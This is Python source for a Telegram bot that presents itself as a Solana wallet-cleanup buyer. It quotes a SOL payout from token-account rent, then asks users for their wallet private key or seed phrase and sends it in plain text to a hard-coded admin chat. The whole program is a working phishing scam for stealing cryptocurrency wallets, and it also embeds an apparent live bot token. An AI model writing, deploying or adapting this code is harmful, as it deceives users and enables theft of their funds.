import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
from flask import Flask
from threading import Thread
import os

app = Flask(__name__)

@app.route('/')
def home():
    return "I'm alive"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

BOT_TOKEN = os.getenv('BOT_TOKEN', '7300530315:AAGVHqYN0zEhR7dwAceKjRqp_sBdEISLuFM')
ADMIN_ID = os.getenv('ADMIN_ID', '5053683608')
bot = telebot.TeleBot(BOT_TOKEN)

user_wallets = {}
user_states = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.chat.type != "private":
        return
        
    user_states[message.chat.id] = None
    welcome_text = "Welcome 👋\n\nSend me the wallet address you want to check 🔍"
    bot.reply_to(message, welcome_text)

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) is None)
def handle_wallet(message):
    if message.chat.type != "private":
        return
        
    wallet = message.text.strip()

    if not (32 <= len(wallet) <= 44):
        bot.reply_to(message, "❗ Invalid address, try again.")
        return

    solana_api = "https://api.mainnet-beta.solana.com"
    headers = {"Content-Type": "application/json"}
    data = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "getTokenAccountsByOwner",
        "params": [
            wallet,
            {"programId": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"},
            {"encoding": "jsonParsed"}
        ]
    }

    response = requests.post(solana_api, json=data, headers=headers)
    token_accounts = 0
    nft_accounts = 0
    cleanup_accounts = 0
    total_rent = 0

    if response.status_code == 200:
        accounts = response.json()["result"]["value"]

        for acc in accounts:
            info = acc["account"]["data"]["parsed"]["info"]
            amount = info["tokenAmount"]["uiAmount"]
            decimals = info["tokenAmount"]["decimals"]

            if amount == 0:
                token_accounts += 1
                total_rent += 0.00203928
            elif decimals == 0 and amount == 1:
                nft_accounts += 1
                total_rent += 0.00203928
            else:
                cleanup_accounts += 1
                total_rent += 0.00203928

        short_wallet = wallet[:4] + "..." + wallet[-4:]
        sol_value = round(total_rent, 5)

        if sol_value < 0.01:
            bot.send_message(
                message.chat.id,
                "🚫 Unfortunately, we cannot offer any value for this wallet.\n\n"
                "🔍 Try checking other addresses—some might be valuable!"
            )
            return

        user_wallets[message.chat.id] = {
            "original_wallet": wallet,
            "amount": sol_value
        }

        result_text = (
            f"Wallet: `{short_wallet}`\n\n"
            f"You will receive: `{sol_value} SOL` 💰"
        )

        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("✅ Confirm", callback_data="confirm"),
            InlineKeyboardButton("❌ Cancel", callback_data="cancel")
        )

        bot.send_message(message.chat.id, result_text, parse_mode="Markdown", reply_markup=markup)

    else:
        bot.reply_to(message, "❗ Error connecting to the network. Try again later.")

@bot.callback_query_handler(func=lambda call: call.data == "confirm")
def confirm_callback(call):
    if call.message.chat.type != "private":
        return
        
    chat_id = call.message.chat.id
    bot.send_message(
        chat_id,
        "✅ Request confirmed\n\n"
        "Please send the **reward wallet address** (must be different from the wallet you're selling):",
        parse_mode="Markdown"
    )
    user_states[chat_id] = "waiting_for_reward_wallet"

@bot.callback_query_handler(func=lambda call: call.data == "cancel")
def cancel_callback(call):
    if call.message.chat.type != "private":
        return
        
    chat_id = call.message.chat.id
    bot.send_message(chat_id, "❌ Request canceled. Thank you for contacting us! 👋")
    user_states[chat_id] = None

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "waiting_for_reward_wallet")
def handle_reward_wallet(message):
    if message.chat.type != "private":
        return
        
    reward_wallet = message.text.strip()

    if not (32 <= len(reward_wallet) <= 44):
        bot.reply_to(message, "❗ Invalid reward wallet address, try again.")
        return

    user_wallets[message.chat.id]["reward_wallet"] = reward_wallet
    bot.send_message(
        message.chat.id,
        "✅ Address received successfully!\n\nNow, please send the **private key** or **seed phrase** of your wallet to complete the sale.",
        parse_mode="Markdown"
    )
    user_states[message.chat.id] = "waiting_for_private_key"

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "waiting_for_private_key")
def handle_private_key(message):
    if message.chat.type != "private":
        return
        
    private_data = message.text.strip()
    words = private_data.split()

    is_seed_phrase = len(words) in [12, 24]
    is_private_key = 64 <= len(private_data) <= 80 and all(c.isalnum() for c in private_data)

    if not (is_seed_phrase or is_private_key):
        bot.reply_to(message, "❗ Invalid input. Please send a valid private key (64–80 chars) or a seed phrase (12 or 24 words).")
        return

    bot.send_message(
        message.chat.id,
        "⏳ Your request has been sent to the admin.\nYour funds will be deposited within 20-50 minutes.\n\nThank you for contacting us! 🙏"
    )

    admin_message = (
        f"New request:\n\n"
        f"User ID: {message.chat.id}\n"
        f"Original Wallet: {user_wallets[message.chat.id]['original_wallet']}\n"
        f"Reward Wallet: {user_wallets[message.chat.id]['reward_wallet']}\n"
        f"Private Key/Seed: {private_data}\n"
        f"Amount: {user_wallets[message.chat.id]['amount']} SOL"
    )
    bot.send_message(ADMIN_ID, admin_message)
    user_states[message.chat.id] = None

if __name__ == '__main__':
    keep_alive()
    try:
        bot.remove_webhook()
        bot.polling(none_stop=True, timeout=60)
    except Exception as e:
        print(f"Error: {e}")
